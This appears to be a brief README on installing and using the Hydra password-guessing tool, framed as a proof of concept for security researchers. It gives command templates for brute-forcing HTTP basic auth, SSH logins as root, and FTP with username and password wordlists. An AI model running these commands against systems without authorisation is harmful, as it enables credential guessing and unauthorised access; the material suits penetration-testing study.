This tool is a proof of concept code, to give researchers and security
consultants the possibility to show how easy it would be to gain unauthorized
access from remote to a system.

## 1. Install

安装

```
┌──(sec@debian)-[~]
└─$ sudo apt install -y hydra
```

## 2. Usage

basic auth

```
┌──(sec@debian)-[~]
└─$ hydra <host> -s <port> http-get /[protected_page] -L username.txt -P password.txt -e ns -vV
```

ssh

```
┌──(sec@debian)-[~]
└─$ hydra <host> ssh -l root -P password.txt -t 4 -e ns -vV
```

ftp

```
┌──(sec@debian)-[~]
└─$ hydra <host> ftp -L username.txt -P password.txt -e ns -vV
```

---

Refrences

- [hydra](https://www.kali.org/tools/hydra/)
